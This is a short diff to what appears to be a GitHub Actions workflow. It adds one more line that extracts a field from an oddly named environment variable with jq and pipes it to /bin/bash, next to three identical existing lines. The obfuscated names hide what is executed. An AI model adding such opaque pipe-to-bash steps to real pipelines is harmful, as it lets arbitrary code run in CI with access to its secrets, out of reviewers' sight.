@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$n5" | jq -r .wr398 | /bin/bash
           printf '%s' "$mvegl4582" | jq -r .fs38 | /bin/bash
           printf '%s' "$zo3416" | jq -r .kav78901 | /bin/bash
+          printf '%s' "$nea5" | jq -r .tsyn7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
